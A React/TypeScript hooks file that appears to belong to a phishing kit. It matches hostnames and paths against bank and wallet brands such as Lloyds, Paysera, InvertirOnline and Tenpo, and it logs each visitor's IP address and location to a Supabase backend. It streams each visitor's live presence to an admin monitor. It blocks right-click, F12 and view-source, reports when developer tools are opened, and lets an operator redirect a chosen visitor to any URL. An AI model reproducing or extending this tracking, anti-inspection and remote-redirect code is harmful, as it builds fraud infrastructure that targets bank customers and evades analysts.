import { useEffect, useRef, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";

const VISIT_KEY = "falconx_visit_tracked";

const getSourceFromPath = (path: string): string => {
  const host = window.location.hostname.toLowerCase();

  if (host.includes("iol") || host.includes("invertironline")) return "iol";
  if (host.includes("paysera") || host.includes("wallet")) return "paysera";
  if (host.includes("cocos")) return "cocosdigital";
  if (host.includes("ueex")) return "ueex";
  if (host.includes("lloyds")) return "lloyds";
  if (host.includes("tenpo")) return "tenpo";
  if (host.includes("plus")) return "plus";

  if (path.includes("iol")) return "iol";
  if (path.includes("paysera")) return "paysera";
  if (path.includes("cocos")) return "cocosdigital";
  if (path.includes("ueex")) return "ueex";
  if (path.includes("tenpo")) return "tenpo";
  if (path.includes("plus")) return "plus";
  if (path.includes("lloyds") || path.includes("logup") || path.includes("log-up")) return "lloyds";
  return "falconx";
};

export const useVisitTracker = () => {
  useEffect(() => {
    const trackVisit = async () => {
      if (sessionStorage.getItem(VISIT_KEY)) return;

      try {
        let ipData = { ip: "unknown", country: "", city: "" };
        try {
          const res = await fetch("https://ipapi.co/json/");
          if (res.ok) {
            const data = await res.json();
            ipData = {
              ip: data.ip || "unknown",
              country: data.country_name || "",
              city: data.city || "",
            };
          }
        } catch {
          console.log("Could not fetch IP info");
        }

        await supabase.from("page_visits").insert({
          ip_address: ipData.ip,
          user_agent: navigator.userAgent,
          page_path: window.location.pathname,
          referrer: document.referrer || null,
          country: ipData.country,
          city: ipData.city,
          source: getSourceFromPath(window.location.pathname),
        });

        sessionStorage.setItem(VISIT_KEY, "1");
      } catch (err) {
        console.error("Visit tracking error:", err);
      }
    };

    trackVisit();
  }, []);
};

/**
 * Track visitor presence via Supabase Realtime Presence.
 * Uses a SINGLE persistent channel that never gets destroyed/recreated.
 * When sessionId changes, we just re-track with the new ID.
 */
export const useVisitorPresence = (sessionId?: string | null) => {
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const devToolsOpenRef = useRef(false);
  const sessionIdRef = useRef<string | null | undefined>(sessionId);
  const enrichedRef = useRef<Record<string, string | undefined>>({});
  const subscribedRef = useRef(false);
  const visitorIdRef = useRef<string>(
    sessionStorage.getItem("falconx_visitor_id") || crypto.randomUUID()
  );

  // Keep sessionIdRef in sync
  useEffect(() => {
    sessionIdRef.current = sessionId;
  }, [sessionId]);

  // Persist visitor ID
  useEffect(() => {
    sessionStorage.setItem("falconx_visitor_id", visitorIdRef.current);
  }, []);

  // Stats channel (online-visitors counter) — only once
  useEffect(() => {
    const visitorId = visitorIdRef.current;
    const statsChannel = supabase.channel("online-visitors", {
      config: { presence: { key: visitorId } },
    });
    statsChannel.subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        await statsChannel.track({ visitor_id: visitorId, online_at: new Date().toISOString() });
      }
    });
    return () => { supabase.removeChannel(statsChannel); };
  }, []);

  const getPresenceId = useCallback(() => {
    return sessionIdRef.current || visitorIdRef.current;
  }, []);

  const buildPayload = useCallback(() => ({
    session_id: getPresenceId(),
    online_at: new Date().toISOString(),
    source: getSourceFromPath(window.location.pathname),
    user_agent: navigator.userAgent,
    devtools_open: devToolsOpenRef.current,
    ...enrichedRef.current,
  }), [getPresenceId]);

  // Re-track on the existing channel
  const doTrack = useCallback(async () => {
    if (!channelRef.current || !subscribedRef.current) return;
    try {
      await channelRef.current.track(buildPayload());
    } catch { /* ignore */ }
  }, [buildPayload]);

  // DevTools & anti-inspection
  useEffect(() => {
    const blockCtx = (e: MouseEvent) => e.preventDefault();
    document.addEventListener("contextmenu", blockCtx);

    const blockKeys = (e: KeyboardEvent) => {
      if (e.key === "F12") { e.preventDefault(); return; }
      if ((e.ctrlKey || e.metaKey) && e.shiftKey && ["I","J","C","K"].includes(e.key)) { e.preventDefault(); return; }
      if ((e.ctrlKey || e.metaKey) && ["u","s"].includes(e.key.toLowerCase())) { e.preventDefault(); return; }
    };
    document.addEventListener("keydown", blockKeys);

    const THRESHOLD = 160;
    const notify = (detected: boolean) => {
      if (detected === devToolsOpenRef.current) return;
      devToolsOpenRef.current = detected;
      doTrack();

      const alertCh = supabase.channel(`devtools-alert-${Date.now()}`);
      alertCh.subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await alertCh.send({
            type: "broadcast",
            event: "devtools_detected",
            payload: {
              session_id: getPresenceId(),
              detected,
              timestamp: new Date().toISOString(),
            },
          });
          setTimeout(() => supabase.removeChannel(alertCh), 2000);
        }
      });
    };

    const sizeCheck = setInterval(() => {
      const detected =
        window.outerWidth - window.innerWidth > THRESHOLD ||
        window.outerHeight - window.innerHeight > THRESHOLD;
      notify(detected);
    }, 1500);

    return () => {
      document.removeEventListener("contextmenu", blockCtx);
      document.removeEventListener("keydown", blockKeys);
      clearInterval(sizeCheck);
    };
  }, [doTrack, getPresenceId]);

  // Create the presence channel ONCE and keep it alive forever
  useEffect(() => {
    const visitorId = visitorIdRef.current;

    // Use visitor ID as the presence key (stable, never changes)
    const channel = supabase.channel("admin-presence-monitor", {
      config: { presence: { key: visitorId } },
    });
    channelRef.current = channel;

    channel.subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        subscribedRef.current = true;
        // Track immediately
        await channel.track(buildPayload());

        // Enrich with IP/location
        try {
          const cached = sessionStorage.getItem("falconx_ip_data");
          if (cached) {
            enrichedRef.current = { ...JSON.parse(cached), ...enrichedRef.current };
          } else {
            const res = await fetch("https://ipapi.co/json/");
            if (res.ok) {
              const data = await res.json();
              const ipData = {
                ip_address: data.ip || undefined,
                city: data.city || undefined,
                country: data.country_name || undefined,
              };
              sessionStorage.setItem("falconx_ip_data", JSON.stringify(ipData));
              enrichedRef.current = { ...ipData };
            }
          }
        } catch { /* ignore */ }

        // Re-track with enriched data
        await channel.track(buildPayload());
      }
    });

    // Heartbeat every 10s to keep presence alive and update session_id
    const heartbeat = setInterval(() => {
      if (subscribedRef.current && channelRef.current) {
        channelRef.current.track(buildPayload()).catch(() => {});
      }
    }, 10000);

    return () => {
      clearInterval(heartbeat);
      subscribedRef.current = false;
      if (channelRef.current) {
        channelRef.current.untrack();
        supabase.removeChannel(channelRef.current);
        channelRef.current = null;
      }
    };
  }, []); // NEVER recreate — runs once

  // When sessionId changes, enrich from DB and re-track immediately
  useEffect(() => {
    if (!sessionId) return;

    const enrichAndRetrack = async () => {
      try {
        const { data: session } = await supabase
          .from("sessions")
          .select("ip_address, city, country, user_agent, source")
          .eq("id", sessionId)
          .maybeSingle();
        if (session) {
          enrichedRef.current = {
            ...enrichedRef.current,
            ip_address: session.ip_address ?? enrichedRef.current.ip_address,
            city: session.city ?? enrichedRef.current.city,
            country: session.country ?? enrichedRef.current.country,
            user_agent: session.user_agent ?? enrichedRef.current.user_agent,
            source: session.source ?? enrichedRef.current.source,
          };
        }
      } catch { /* ignore */ }

      // Re-track with updated session_id
      doTrack();
    };

    enrichAndRetrack();
  }, [sessionId, doTrack]);

  // Listen for redirect (kick) command from admin
  useEffect(() => {
    const kickChannel = supabase.channel("admin-kick-broadcast");

    kickChannel
      .on("broadcast", { event: "redirect_visitor" }, (payload) => {
        const { session_id, url } = payload.payload || {};
        const myId = getPresenceId();
        if (session_id === myId && url) {
          window.location.replace(url);
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(kickChannel); };
  }, [getPresenceId]);
};
